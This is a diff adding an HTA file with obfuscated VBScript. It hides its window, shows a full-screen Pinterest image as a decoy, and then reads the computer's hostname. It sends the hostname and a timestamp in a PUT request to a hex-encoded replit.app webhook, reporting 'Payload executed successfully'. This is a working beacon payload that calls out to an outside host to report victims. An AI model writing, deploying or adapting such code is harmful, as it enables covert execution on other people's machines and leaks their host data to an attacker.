@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title> </title>
+    <hta:application
+        id="app"
+        border="none"
+        innerborder="no"
+        caption="no"
+        sysmenu="no"
+        maximizebutton="no"
+        minimizebutton="no"
+        contextmenu="no"
+        selection="no"
+        windowstate="maximize"
+        showintaskbar="no"
+    />
+    <script language="vbscript">
+        ' Обфускований HTA: повноекранна картинка + PUT-вебхук
+        Function D(s)
+            Dim i, r
+            r = ""
+            For i = 1 To Len(s) Step 2
+                r = r & Chr(CLng("&H" & Mid(s, i, 2)))
+            Next
+            D = r
+        End Function
+
+        Sub Window_OnLoad
+            On Error Resume Next
+
+            ' === Повноекранна картинка ===
+            Dim iu, img
+            iu = D("68747470733A2F2F692E70696E696D672E636F6D2F373336782F31362F61322F62382F31366132623830613633643333653239383637633863626538356430323936352E6A7067")
+            ' https://i.pinimg.com/736x/16/a2/b8/16a2b80a63d33e29867c8cbe85d02965.jpg
+            img = "<img src='" & iu & "' style='position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;border:none;'>"
+            document.body.innerHTML = img
+
+            ' === PUT-запит на вебхук ===
+            Dim wh, tx, ts, hn, jn, http, resp
+            wh = D("68747470733A2F2F657365742D626F742D73656E6465722D2D30783177697A6172642E7265706C69742E6170702F6170692F657365742D776562686F6F6B")
+            ' https://eset-bot-sender--0xw1zard.replit.app/api/eset-webhook
+            tx = D("5061796C6F6164206578656375746564207375636365737366756C6C79")
+            ' "Payload executed successfully"
+            ts = D("74696D657374616D70")
+            ' "timestamp"
+            hn = D("686F73746E616D65")
+            ' "hostname"
+            jn = D("74657874")
+            ' "text"
+
+            Dim tsVal, hnVal
+            tsVal = Now()
+            Set ws = CreateObject("WScript.Shell")
+            hnVal = ws.ExpandEnvironmentStrings("%COMPUTERNAME%")
+
+            Dim json
+            json = "{""" & jn & """:""" & tx & """,""" & ts & """:""" & tsVal & """,""" & hn & """:""" & hnVal & """}"
+
+            Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+            http.Open "PUT", wh, False
+            http.setRequestHeader "Content-Type", "application/json"
+            http.Send json
+        End Sub
+    </script>
+</head>
+<body></body>
+</html>
